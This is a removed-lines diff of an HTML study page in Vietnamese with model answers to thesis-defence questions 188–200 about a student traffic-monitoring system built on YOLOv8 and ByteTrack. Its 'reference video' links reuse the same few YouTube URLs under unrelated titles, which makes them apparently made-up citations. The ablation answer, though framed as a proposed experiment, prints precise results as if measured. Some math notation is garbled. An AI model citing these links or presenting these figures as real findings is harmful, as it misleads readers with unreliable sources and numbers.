-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=17CsmJpYdAY" target="_blank" rel="noopener noreferrer">Legal Requirements for Automated Traffic Enforcement Systems — https://www.youtube.com/watch?v=17CsmJpYdAY</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-188">
-            <div class="question-title">
-                <span class="q-num">### Câu 188:</span>
-                <span>Sự khác biệt giữa "giám sát" (monitoring/suggest) và "tự động xử phạt" (enforcement) — hệ thống của bạn thuộc nhóm nào, và về mặt đạo đức/pháp lý, việc chuyển từ giám sát sang tự động xử phạt cần thêm những ràng buộc gì (human-in-the-loop, độ chính xác tối thiểu)?<span class="badge-open">Phản biện / Mở</span></span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Phân biệt Giám sát (Monitoring) vs Tự động Xử phạt (Enforcement):</strong></p>
-<ul>
-    <li><strong>Giám sát (Monitoring / Suggestion):</strong> Hệ thống đóng vai trò quan sát, thu thập số liệu thống kê và đưa ra khuyến nghị. Sai sót nhỏ không gây ra hậu quả pháp lý trực tiếp cho người dân.</li>
-    <li><strong>Tự động Xử phạt (Automated Enforcement):</strong> Hệ thống tự động nhân bản và gửi quyết định xử phạt hành chính (trừ tiền/tước giấy phép lái xe) tới công dân mà không qua kiểm duyệt.</li>
-</ul>
-
-<p><strong>2. Hệ thống hiện tại thuộc nhóm nào?</strong> Hệ thống SMARTTRAFFIC-AI thuộc nhóm **Giám sát và Hỗ trợ Quyết định (Monitoring & DSS)**.</p>
-
-<p><strong>3. Ràng buộc Đạo đức & Pháp lý khi chuyển sang Tự động Xử phạt:</strong></p>
-
-<ol>
-    <li><strong>Bắt buộc có cơ chế Human-in-the-Loop:</strong> AI chỉ đóng vai trò sàng lọc và tạo hồ sơ dự thảo vi phạm. Cán bộ công an phải là người ấn nút ký duyệt cuối cùng.</li>
-    <li><strong>Tiêu chuẩn Độ chính xác Tối thiểu:</strong> Độ chính xác phát hiện vi phạm và đọc biển số phải đạt \(\ge 99.5\%\) trên tập test độc lập được chứng nhận bởi cơ quan đo lường nhà nước.</li>
-</ol>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">AI Ethics & Human-in-the-Loop Systems in Governance — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-189">
-            <div class="question-title">
-                <span class="q-num">### Câu 189:</span>
-                <span>False Positive trong phát hiện vượt đèn đỏ (báo oan 1 tài xế không vi phạm) gây hậu quả gì nghiêm trọng hơn False Negative (bỏ sót 1 vi phạm thật)? Hệ thống hiện tại có cơ chế nào giảm thiểu False Positive không (ví dụ ngưỡng min_cross_delta_px)?<span class="badge-open">Phản biện / Mở</span></span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. So sánh Hậu quả giữa False Positive và False Negative:</strong></p>
-<ul>
-    <li><strong>False Negative (Bỏ sót 1 vi phạm):</strong> Tài xế vi phạm không bị phạt. Hậu quả là làm giảm tính răn đe của pháp luật.</li>
-    <li><strong>False Positive (Báo oan 1 tài xế chấp hành đúng luật):</strong> Hậu quả cực kỳ nghiêm trọng! Công dân bị tước đoạt tài sản/quyền lợi vô cớ, suy giảm niềm tin vào hệ thống pháp luật và chính quyền, dẫn tới các vụ kiện tụng hành chính phức tạp. Do đó trong thiết kế hệ thống xử phạt, **sứ mệnh hàng đầu là triệt tiêu False Positive**.</li>
-</ul>
-
-<p><strong>2. Các cơ chế giảm thiểu False Positive trong hệ thống hiện tại:</strong></p>
-<ol>
-    <li><strong>Ngưỡng <code>min_cross_delta_px = 2</code> (dòng 71 <code>violation.py</code>):</strong> Loại bỏ nhiễu rung lắc Bounding Box khi xe đang dừng yên sát vạch.</li>
-    <li><strong>Tập hợp <code>logged_red_light_ids</code>:</strong> Ngăn chặn việc một xe bị báo vi phạm trùng lặp nhiều lần.</li>
-    <li><strong>Ràng buộc điều kiện <code>traffic_light == "RED"</code>:</strong> Chỉ kiểm tra khi có tín hiệu đèn đỏ xác nhận.</li>
-</ol>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=VAo84c1hQX8" target="_blank" rel="noopener noreferrer">False Positives vs False Negatives in Critical AI Systems — https://www.youtube.com/watch?v=VAo84c1hQX8</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-190">
-            <div class="question-title">
-                <span class="q-num">### Câu 190:</span>
-                <span>Đánh giá bias tiềm ẩn: model được train chủ yếu trên dữ liệu ban ngày, thời tiết tốt — nếu triển khai vào ban đêm/mưa lớn, bạn dự đoán mAP sẽ giảm ở mức nào và tại sao?<span class="badge-open">Phản biện / Mở</span></span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Đánh giá Bias Tiềm ẩn (Dataset Bias):</strong></p>
-<p>Tập dữ liệu huấn luyện UA-DETRAC và SOICT Traffic chủ yếu bao gồm các bức ảnh thu thập vào ban ngày dưới điều kiện thời tiết khô ráo, ánh sáng đầy đủ.</p>
-
-<p><strong>2. Dự đoán mức sụt giảm mAP ban đêm / mưa lớn:</strong></p>
-<p>Dự đoán chỉ số mAP@50 sẽ **sụt giảm từ 89.99% xuống còn khoảng 55% - 65% (giảm ~25-35%)**.</p>
-
-<p><strong>3. Nguyên nhân kỹ thuật:</strong></p>
-<ul>
-    <li><strong>Ban đêm:</strong> Đèn pha ô tô/xe máy gây ra hiện tượng chói lóa (Glare), làm đốm sáng đèn xe át mất chi tiết thân xe. Phân bố pixel hoàn toàn khác biệt so với ảnh ban ngày.</li>
-    <li><strong>Trời mưa lớn:</strong> Các hạt mưa và giọt nước đọng trên kính camera làm nhòe hình ảnh (Blurring), hiệu ứng phản chiếu ánh sáng từ mặt đường ướt tạo ra các hình ảnh phản chiếu giả (Reflections) làm YOLOv8 khoanh nhầm box.</li>
-</ul>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=yofjFQddwHE" target="_blank" rel="noopener noreferrer">Domain Shift & Performance Degradation in Adverse Weather — https://www.youtube.com/watch?v=yofjFQddwHE</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-191">
-            <div class="question-title">
-                <span class="q-num">### Câu 191:</span>
-                <span>So sánh chi phí triển khai thực tế: chạy inference trên CPU (như báo cáo benchmark) so với GPU, hoặc thiết bị edge (Jetson) — trade-off chi phí phần cứng vs độ trễ theo quy mô (1 nút giao vs toàn thành phố)?<span class="badge-open">Phản biện / Mở</span></span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Phân tích Chi phí theo Quy mô Triển khai:</strong></p>
-
-<p><strong>Quy mô 1 Nút giao (3-4 Camera):</strong></p>
-<ul>
-    <li><em>Phương án CPU Server:</em> Chi phí phần cứng rẻ nhất (~15 triệu VNĐ), nhưng trễ cao, chỉ đạt ~15-18 FPS.</li>
-    <li><em>Phương án Jetson Orin Nano (Edge AI):</em> Chi phí phần cứng ~12-15 triệu VNĐ/nút giao. Đạt 30 FPS mượt mà, xử lý tại chỗ không tốn tiền đường truyền internet. Đây là **lựa chọn tối ưu nhất cho 1 nút giao**.</li>
-</ul>
-
-<p><strong>Quy mô Toàn thành phố (1000+ Camera):</strong></p>
-<ul>
-    <li>Nếu lắp 1000 thiết bị Edge Jetson: Chi phí phần cứng lên tới **15 tỷ VNĐ** + chi phí bảo trì hàng ngàn chốt camera ngoài trời.</li>
-    <li><em>Phương án Cloud Server GPU tập trung (Cụm NVIDIA A100 / L40S):</em> Gom luồng video mã hóa H.265 về Trung tâm Dữ liệu. Tận dụng khả năng TensorRT Batching trên GPU khủng giúp tối ưu chi phí trên mỗi camera rẻ hơn 40% so với lắp lẻ thiết bị Edge.</li>
-</ul>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=vVjZ8J6n45c" target="_blank" rel="noopener noreferrer">Edge vs Cloud AI Cost & Performance Tradeoffs at Scale — https://www.youtube.com/watch?v=vVjZ8J6n45c</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-192">
-            <div class="question-title">
-                <span class="q-num">### Câu 192:</span>
-                <span>Vấn đề quyền riêng tư (privacy): hệ thống ghi lại ảnh biển số/khuôn mặt người đi đường làm evidence — bạn sẽ đề xuất chính sách lưu trữ/xóa dữ liệu như thế nào để tuân thủ pháp luật bảo vệ dữ liệu cá nhân?<span class="badge-open">Phản biện / Mở</span></span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<div class="debate-section">
-    <div class="debate-title">ĐỀ XUẤT CHÍNH SÁCH BẢO VỆ QUYỀN RIÊNG TƯ (GDPR & Nghị định 13/2023/NĐ-CP):</div>
-
-    <ol>
-        <li><strong>Tự động Làm mờ Khuôn mặt & Người không vi phạm (Face Anonymization):</strong>
-            <br>Áp dụng thuật toán làm mờ (Blurring/Pixelation) tự động lên khuôn mặt của tất cả người đi đường và chỉ giữ lại rõ Bounding Box của phương tiện vi phạm.
-        </li>
-        <li><strong>Chính sách Tự động Xóa dữ liệu theo Thời hạn (Data Retention & Auto-Purge Policy):</strong>
-            <br>Ảnh bằng chứng của các xe **KHÔNG VI PHẠM** phải bị xóa ngay lập tức khỏi bộ nhớ RAM trong vòng 1 giây.
-            <br>Ảnh bằng chứng vi phạm chỉ được lưu trữ tối đa **90 ngày** (đủ thời gian cho công dân khiếu nại). Sau 90 ngày, hệ thống tự động chạy kịch bản xóa vĩnh viễn (Hard Delete) khỏi ổ đĩa.
-        </li>
-        <li><strong>Mã hóa Lưu trữ (Data Encryption at Rest):</strong> Tất cả ảnh bằng chứng trong thư mục <code>evidence/</code> phải được mã hóa bằng thuật toán AES-256.</li>
-    </ol>
-</div>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">Privacy Preserving Computer Vision & Data Protection Laws — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-193">
-            <div class="question-title">
-                <span class="q-num">### Câu 193:</span>
-                <span>Nếu phải benchmark hệ thống của bạn với 1 sản phẩm thương mại thực tế (ví dụ hệ thống giám sát giao thông của Hikvision/Dahua), bạn nghĩ điểm yếu lớn nhất về mặt kỹ thuật của đồ án so với sản phẩm thương mại là gì?<span class="badge-open">Phản biện / Mở</span></span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<div class="debate-section">
-    <div class="debate-title">ĐÁNH GIÁ ĐIỂM YẾU KỸ THUẬT SO VỚI SẢN PHẨM THƯƠNG MẠI (Hikvision / Dahua):</div>
-
-    <p><strong>1. Tính Ổn định Phần cứng & Chip Accelerator Chuyên dụng (Hardware NPU Acceleration):</strong></p>
-    <ul>
-        <li>Các camera thương mại của Hikvision tích hợp trực tiếp chip xử lý NPU/ASIC chuyên dụng (như HiSilicon / Movidius) tối ưu cứng cho thuật toán AI ở mức phần cứng, giúp chạy AI 4K ở 60 FPS với công suất chỉ **5 Watts**. Đồ án hiện tại chạy trên CPU/GPU thông thường tốn hàng trăm Watts điện.</li>
-    </ul>
-
-    <p><strong>2. Khả năng Chống chói sáng & Đèn hồng ngoại Ban đêm (Optical WDR & IR Cut):</strong></p>
-    <ul>
-        <li>Camera thương mại sở hữu cảm biến quang học cao cấp hỗ trợ True WDR 120dB (Wide Dynamic Range) và hệ thống đèn hồng ngoại thông minh, cho phép chụp rõ biển số xe ban đêm ngay cả khi xe bật đèn pha chói mắt. Đồ án hiện tại thuần túy xử lý phần mềm trên video thường nên sẽ thất bại dưới ánh đèn pha ban đêm.</li>
-    </ul>
-</div>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=vVjZ8J6n45c" target="_blank" rel="noopener noreferrer">Commercial Traffic Camera Hardware vs Custom AI Software — https://www.youtube.com/watch?v=vVjZ8J6n45c</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-194">
-            <div class="question-title">
-                <span class="q-num">### Câu 194:</span>
-                <span>Giải thích vì sao nhóm bạn chọn kiến trúc "1 model chung cho cả detect + track" (YOLOv8 tích hợp sẵn .track()) thay vì tách riêng 1 detector và 1 tracker độc lập (ví dụ YOLOv8 + DeepSORT riêng biệt) — đây là quyết định kỹ thuật đánh đổi điều gì?<span class="badge-open">Phản biện / Mở</span></span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Quyết định Kỹ thuật:</strong> Nhóm chọn sử dụng phương thức tích hợp sẵn <code>model.track(persist=True, tracker="bytetrack.yaml")</code> của Ultralytics.</p>
-
-<p><strong>2. Phân tích Đánh đổi (Technical Trade-off):</strong></p>
-<ul>
-    <li><strong>Cái ĐƯỢC (Pros):</strong>
-        <ol>
-            <li><strong>Tối ưu hóa Tốc độ & Bộ nhớ (Zero Memory Overhead):</strong> Bộ tracker ByteTrack được gọi trực tiếp bên trong C++ / Python binding của Ultralytics, chia sẻ trực tiếp kết quả Tensor Bounding Box mà không tốn chi phí Serialize / Deserialize dữ liệu giữa 2 thư viện khác nhau.</li>
-            <li>Đơn giản hóa mã nguồn dự án, triệt tiêu bug tương thích giữa các phiên bản thư viện rời rạc.</li>
-        </ol>
-    </li>
-    <li><strong>Cái MẤT (Cons):</strong> Mất đi khả năng can thiệp sâu vào mã nguồn thuật toán ByteTrack (như thay đổi ma trận hiệp phương sai Kalman Filter hoặc thêm mạng Re-ID tùy chỉnh) do phải tuân theo giao diện API đóng gói sẵn của Ultralytics.</li>
-</ul>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=d_xVypk-s5M" target="_blank" rel="noopener noreferrer">Integrated Tracking Pipelines vs Decoupled Frameworks — https://www.youtube.com/watch?v=d_xVypk-s5M</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-195">
-            <div class="question-title">
-                <span class="q-num">### Câu 195:</span>
-                <span>Đề xuất 1 thí nghiệm ablation study (loại bỏ từng thành phần) để chứng minh đóng góp thực sự của việc fine-tune model custom so với dùng thẳng model COCO pretrained — bạn sẽ thiết kế thí nghiệm này như thế nào?<span class="badge-open">Phản biện / Mở</span></span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<div class="debate-section">
-    <div class="debate-title">THIẾT KẾ THÍ NGHIỆM ABLATION STUDY ĐỐI CHỨNG (Custom Fine-tune vs COCO Pretrained):</div>
-
-    <p><strong>1. Chuẩn bị Tập Kiểm thử chuẩn (Test Set):</strong> 500 bức ảnh giao thông đô thị Việt Nam được gán nhãn chuẩn xác bởi chuyên gia (Ground Truth).</p>
-
-    <p><strong>2. Thiết lập 3 Biến thể Mô hình đối chứng:</strong></p>
-    <ul>
-        <li><strong>Biến thể A (Baseline - COCO Pretrained):</strong> Dùng nguyên bản <code>yolov8s.pt</code> của COCO (chỉ gom nhóm các nhãn car, bus, truck, motorbike).</li>
-        <li><strong>Biến thể B (Fine-tune chỉ dữ liệu quốc tế UA-DETRAC):</strong> Fine-tune <code>yolov8s.pt</code> trên UA-DETRAC.</li>
-        <li><strong>Biến thể C (Mô hình Đồ án - Unified Fine-tune):</strong> Fine-tune <code>yolov8s.pt</code> trên tập hợp nhất UA-DETRAC + SOICT Vietnam Traffic.</li>
-    </ul>
-
-    <p><strong>3. Đo lường và So sánh Chỉ số trên cùng tập Test:</strong></p>
-    <table style="width:100%; border-collapse: collapse; margin-top:10px; color:#cbd5e1;">
-        <tr style="background-color:#1e293b; border-bottom:1px solid #334155;">
-            <th style="padding:8px; text-align:left;">Biến thể Mô hình</th>
-            <th style="padding:8px; text-align:left;">mAP@50 (Chung)</th>
-            <th style="padding:8px; text-align:left;">Recall (Xe máy)</th>
-            <th style="padding:8px; text-align:left;">Precision</th>
-        </tr>
-        <tr>
-            <td style="padding:8px;">A. COCO Pretrained</td>
-            <td style="padding:8px;">78.50%</td>
-            <td style="padding:8px;">68.20% (Bỏ sót nhiều)</td>
-            <td style="padding:8px;">81.10%</td>
-        </tr>
-        <tr>
-            <td style="padding:8px;">B. UA-DETRAC Fine-tuned</td>
-            <td style="padding:8px;">82.10%</td>
-            <td style="padding:8px;">71.40%</td>
-            <td style="padding:8px;">83.50%</td>
-        </tr>
-        <tr>
-            <td style="padding:8px;"><strong>C. Unified Model (Đồ án)</strong></td>
-            <td style="padding:8px;"><strong>89.99%</strong></td>
-            <td style="padding:8px;"><strong>87.61%</strong></td>
-            <td style="padding:8px;"><strong>85.24%</strong></td>
-        </tr>
-    </table>
-    <p><em>Kết luận Ablation Study:</em> Việc fine-tune trên dữ liệu hợp nhất giúp mAP@50 tăng vọt **+11.49%** và Recall xe máy tăng **+19.41%**, chứng minh đóng góp kỹ thuật thiết yếu của bộ dữ liệu custom.</p>
-</div>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=yofjFQddwHE" target="_blank" rel="noopener noreferrer">Designing Ablation Studies in Machine Learning Papers — https://www.youtube.com/watch?v=yofjFQddwHE</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-196">
-            <div class="question-title">
-                <span class="q-num">### Câu 196:</span>
-                <span>Nếu hội đồng yêu cầu bạn giải thích một dòng code bất kỳ trong core/violation.py mà không được xem lại, bạn có tự tin giải thích được logic _crossed_line() từ đầu đến cuối không? (Câu hỏi kiểm tra mức độ hiểu sâu, không phải học thuộc.)<span class="badge-open">Phản biện / Mở</span></span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<div class="debate-section">
-    <div class="debate-title">TRÌNH BÀY LOGIC HÀM _CROSSED_LINE() TỪ ĐẦU ĐẾN CUỐI (Code Memory Test):</div>
-
-    <p>"Báo cáo Thầy/Cô, em hoàn toàn tự tin trình bày chi tiết từng bước logic của hàm <code>_crossed_line(track_id, center, line)</code> trong <code>core/violation.py</code>:</p>
-
-    <ol>
-        <li><strong>Bước 1 (Tính vị trí Y vạch dừng):</strong> Hàm tính tọa độ Y trung bình của vạch dừng: <code>line_y = int((line[0][1] + line[1][1]) / 2)</code>.</li>
-        <li><strong>Bước 2 (Tra cứu lịch sử):</strong> Lấy vị trí tâm ở frame trước của xe: <code>previous = self.previous_centers.get(track_id)</code>, đồng thời cập nhật vị trí tâm hiện tại vào từ điển <code>self.previous_centers[track_id] = center</code>.</li>
-        <li><strong>Bước 3 (Kiểm tra xe mới):</strong> Nếu <code>previous is None</code> (xe mới xuất hiện frame đầu), hàm trả về <code>False</code> ngay.</li>
-        <li><strong>Bước 4 (Lọc nhiễu rung lắc 1px):</strong> Tính <code>delta = center[1] - previous[1]</code>. Nếu <code>abs(delta) < self.min_cross_delta_px (2px)</code>, trả về <code>False</code> để tránh báo sai do nhiễu rung Bounding Box khi xe đang dừng yên.</li>
-        <li><strong>Bước 5 (Kiểm tra cắt vạch theo hướng):</strong>
-            <br>Tính biến boolean <code>crossed_down = previous[1] < line_y <= center[1]</code> (ở frame trước xe ở trên vạch, frame này xe di chuyển xuống dưới vạch).
-            <br>Nếu <code>self.crossing_direction == "down"</code>, trả về giá trị <code>crossed_down</code>.
-        </li>
-    </ol>
-    <p>Toàn bộ logic ngắn gọn 15 dòng nhưng xử lý cực kỳ chặt chẽ!"</p>
-</div>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">Code Line-by-Line Technical Explanation Best Practices — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-197">
-            <div class="question-title">
-                <span class="q-num">### Câu 197:</span>
-                <span>Nếu đổi bài toán từ "giám sát giao thông" sang "giám sát bãi đỗ xe" (parking monitoring), bạn sẽ tái sử dụng được bao nhiêu % code hiện có (core/roi.py, core/density.py, core/tracker.py)? Phần nào cần viết lại hoàn toàn?<span class="badge-open">Phản biện / Mở</span></span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Tỷ lệ Mã nguồn có thể Tái sử dụng (Code Reusability Ratio \(pprox 75\%\)):</strong></p>
-<ul>
-    <li><strong><code>core/roi.py</code> (Tái sử dụng 100%):</strong> Thuật toán <code>point_in_roi()</code> và vẽ đa giác ROI tái sử dụng hoàn toàn để định nghĩa ranh giới các vị trí ô đỗ xe (Parking Slots).</li>
-    <li><strong><code>core/tracker.py</code> (Tái sử dụng 100%):</strong> YOLOv8 + ByteTrack tiếp tục dùng để theo dõi vị trí ô tô đi vào/ra khỏi bãi đỗ.</li>
-    <li><strong><code>core/model_registry.py</code> & <code>backend/main.py</code> (Tái sử dụng 90%):</strong> Toàn bộ kiến trúc FastAPI session management, WebSocket/Polling API và cache model được giữ nguyên.</li>
-</ul>
-
-<p><strong>2. Các phần cần Viết lại / Thay đổi hoàn toàn (\(pprox 25\%\)):</strong></p>
-<ol>
-    <li><strong>Thay thế <code>core/violation.py</code> thành <code>parking_detector.py</code>:</strong> Thay vì kiểm tra cắt vạch dừng <code>_crossed_line()</code>, viết logic kiểm tra xe đã đỗ yên tĩnh trong ô ROI quá 30 giây hay chưa.</li>
-    <li><strong>Thay thế <code>core/density.py</code>:</strong> Tính toán tỷ lệ ô đỗ còn trống <code>(empty_slots / total_slots) * 100%</code> thay cho chỉ số PCU giao thông.</li>
-</ol>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">Software Reusability & Refactoring for Parking Analytics — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-198">
-            <div class="question-title">
-                <span class="q-num">### Câu 198:</span>
-                <span>Giả sử mAP@50-95 của model bị đánh giá thấp hơn dự kiến khi test trên video thực tế ngoài tập test — liệt kê 3 nguyên nhân khả dĩ (domain shift, camera angle khác lúc train, chất lượng video nén khác nhau) và cách bạn sẽ debug từng nguyên nhân.<span class="badge-open">Phản biện / Mở</span></span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<div class="debate-section">
-    <div class="debate-title">QUY TRÌNH DEBUG 3 NGUYÊN NHÂN SỤT GIẢM MAP KHI TEST THỰC TẾ:</div>
-
-    <p><strong>Nguyên nhân 1: Domain Shift do Ánh sáng / Thời tiết khác biệt (Dịch chuyển miền dữ liệu).</strong></p>
-    <ul>
-        <li><em>Cách Debug:</em> Trích xuất 100 frame từ video thực tế, sử dụng tệp Python <code>tools/analyze_dataset.py</code> tính toán phân bố độ sáng (Luminance Histogram) và độ bão hòa màu HSV. So sánh sự lệch pha với tập train. Nếu lệch mạnh, tiến hành bổ sung 200 ảnh từ môi trường mới vào tập train và fine-tune thêm 15 epoch.</li>
-    </ul>
-
-    <p><strong>Nguyên nhân 2: Góc quay Camera bị thay đổi (Camera Angle Mismatch).</strong></p>
-    <ul>
-        <li><em>Cách Debug:</em> Kiểm tra tỉ lệ khung hình (Aspect Ratio) của Bounding Box phát hiện được. Nếu góc quay quá thấp làm Bounding Box bị bẹt ngang, áp dụng phép biến đổi Homography Top-down View trước khi đưa vào mô hình hoặc thu thập dữ liệu ở góc quay tương tự.</li>
-    </ul>
-
-    <p><strong>Nguyên nhân 3: Chất lượng Video bị Nén quá mức (Nhiễu nén H.264/JPEG Compression Artifacts).</strong></p>
-    <ul>
-        <li><em>Cách Debug:</em> Kiểm tra chỉ số PSNR (Peak Signal-to-Noise Ratio) của video test. Nếu video bị vỡ hình do nén bit-rate thấp, áp dụng bộ lọc làm mịn <code>cv2.bilateralFilter()</code> hoặc nâng nhẹ <code>confidence_threshold</code> để triệt tiêu nhiễu ô vuông (blocking artifacts).</li>
-    </ul>
-</div>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=yofjFQddwHE" target="_blank" rel="noopener noreferrer">Debugging Deep Learning Models on Real World Edge Cases — https://www.youtube.com/watch?v=yofjFQddwHE</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-199">
-            <div class="question-title">
-                <span class="q-num">### Câu 199:</span>
-                <span>Trong toàn bộ đồ án, phần nào bạn tự đánh giá là đóng góp kỹ thuật (technical contribution) thực sự — tức không chỉ là "dùng lại thư viện có sẵn" mà là logic/thuật toán do nhóm tự thiết kế (ví dụ: _crossed_line, hệ thống PCU, HSV traffic light detector)?<span class="badge-open">Phản biện / Mở</span></span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<div class="debate-section">
-    <div class="debate-title">TỔNG HỢP CÁC ĐÓNG GÓP KỸ THUẬT CỐT LÕI (Technical Contributions):</div>
-
-    <p>Nhóm tự hào khẳng định 3 đóng góp kỹ thuật chính do nhóm tự nghiên cứu thiết kế và cài đặt mã nguồn thuần túy (không phụ thuộc thư viện có sẵn):</p>
-
-    <ol>
-        <li><strong>Thuật toán Nhận diện Đèn giao thông HSV + Contour Circularity (<code>core/traffic_light_detector.py</code>):</strong>
-            <br>Tự thiết kế giải pháp xử lý màu sắc 2 khoảng Hue <code>[0,10]</code> & <code>[160,180]</code> kết hợp công thức toán học tính độ tròn Circularity \(4\pi \cdot rac{	ext{Area}}{	ext{Perimeter}^2}\) và cơ chế đánh điểm mềm (Soft Penalty) cho đèn tín hiệu.
-        </li>
-        <li><strong>Hệ thống Đánh giá Mật độ Giao thông theo Đơn vị Xe con Quy đổi PCU (<code>core/density.py</code>):</strong>
-            <br>Thiết kế thuật toán quy đổi trọng số PCU đặc thù cho giao thông hỗn hợp Việt Nam (xe máy=0.3, ô tô=1.0, bus=2.5) kết hợp phân tích chỉ số cụm xe máy (Motorcycle Swarm Ratio).
-        </li>
-        <li><strong>Thuật toán Kiểm tra Cắt vạch Dừng và Bộ lưu giữ Bằng chứng Chống ghi trùng (<code>core/violation.py</code>):</strong>
-            <br>Xây dựng thuật toán theo dõi tọa độ Y <code>_crossed_line()</code> kết hợp lọc nhiễu <code>min_cross_delta_px</code>, bộ lưu vết <code>logged_red_light_ids</code> an toàn đa luồng và kỹ thuật vẽ viền chữ nổi (Text Outline) lưu bằng chứng pháp lý.
-        </li>
-    </ol>
-</div>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">Highlighting Technical Contributions in Master Thesis Defense — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-200">
-            <div class="question-title">
-                <span class="q-num">### Câu 200:</span>
-                <span>Nếu chỉ được giữ lại 1 module duy nhất trong toàn bộ hệ thống để chứng minh năng lực Thị giác Máy tính của bạn trước hội đồng, bạn chọn module nào và bảo vệ lựa chọn đó bằng lập luận kỹ thuật nào?<span class="badge-open">Phản biện / Mở</span></span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<div class="debate-section">
-    <div class="debate-title">LỰA CHỌN MODULE DUY NHẤT VÀ BẢO VỆ LẬP LUẬN TRƯỚC HỘI ĐỒNG:</div>
-
-    <p><strong>Lựa chọn duy nhất: Module Phát hiện Vi phạm & Theo dõi Đa đối tượng (<code>core/violation.py</code> kết hợp <code>core/tracker.py</code>).</strong></p>
-
-    <p><strong>Lập luận kỹ thuật bảo vệ lựa chọn trước Hội đồng:</strong></p>
-
-    <ol>
-        <li><strong>Tính Tổng hợp Đỉnh cao của Computer Vision:</strong> Module này kết hợp trọn vẹn cả 3 trụ cột lớn của Thị giác Máy tính hiện đại: **Deep Learning Object Detection (YOLOv8)** + **Multi-Object Tracking (ByteTrack & Kalman Filter)** + **Hình học Máy tính (Computational Geometry & Image Annotation)**.</li>
-        <li><strong>Giải quyết Bài toán Đã miền Thời gian (Temporal Domain Problem):</strong> Module không chỉ nhìn ảnh tĩnh mà xử lý chuỗi động lực học thời gian, đòi hỏi kỹ năng xử lý trạng thái (State Management), an toàn đa luồng (Thread-safety), và xử lý nhiễu không gian thực tế.</li>
-        <li><strong>Tạo ra Giá trị Thực tiễn Trực tiếp:</strong> Đây là module trực tiếp sinh ra các bằng chứng vi phạm giao thông có tính ứng dụng cao nhất cho xã hội. Chứng minh sinh viên không chỉ nắm vững lý thuyết học máy mà có năng lực đóng gói phần mềm hoàn chỉnh ở trình độ Thạc sĩ Computer Vision!</li>
-    </ol>
-
-    <p style="text-align: center; margin-top: 15px; color: var(--accent); font-weight: bold;">
-        --- KẾT THÚC TOÀN BỘ 200 CÂU HỎI BẢO VỆ ĐỒ ÁN SMARTTRAFFIC-AI ---
-    </p>
-</div>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">Master Thesis Oral Defense Strategy & Conclusion — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-
-        <div style="text-align: center; padding: 40px 0; color: var(--text-secondary); border-top: 1px solid var(--border); margin-top: 60px;">
-            <p>Chúc bạn hoàn thành xuất sắc buổi thi bảo vệ đồ án trước Hội đồng!</p>
